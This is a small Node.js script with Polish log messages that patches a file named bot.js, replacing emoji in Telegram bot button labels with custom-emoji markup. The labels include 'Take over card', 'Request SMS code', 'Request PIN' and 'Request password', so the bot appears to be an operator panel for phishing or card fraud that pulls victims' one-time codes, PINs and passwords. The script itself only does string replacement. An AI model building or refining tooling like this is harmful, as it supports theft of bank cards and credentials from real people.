const fs = require("fs");
const p = "bot.js";
let c = fs.readFileSync(p, "utf8");
const map = [
	["text: '💳 Przejmij kartę'", 'text: \'<tg-emoji emoji-id="5271792289612588924">💳</tg-emoji> Przejmij kartę\''],
	["text: '📩 Poproś o Potwierdzenie'", 'text: \'<tg-emoji emoji-id="5271993882492559766">📩</tg-emoji> Poproś o Potwierdzenie\''],
	["text: '📱 Poproś o Kod z SMS'", 'text: \'<tg-emoji emoji-id="5271993882492559766">📱</tg-emoji> Poproś o Kod z SMS\''],
	["text: '💳 Poproś o PIN'", 'text: \'<tg-emoji emoji-id="5271993882492559766">💳</tg-emoji> Poproś o PIN\''],
	["text: '🔐 Poproś o Hasło'", 'text: \'<tg-emoji emoji-id="5271993882492559766">🔐</tg-emoji> Poproś o Hasło\''],
];
let n = 0;
for (const [a, b] of map) {
	const before = c;
	c = c.split(a).join(b);
	if (before !== c) n++; else console.log("BRAK", a);
}
fs.writeFileSync(p, c);
console.log("zmian:", n);
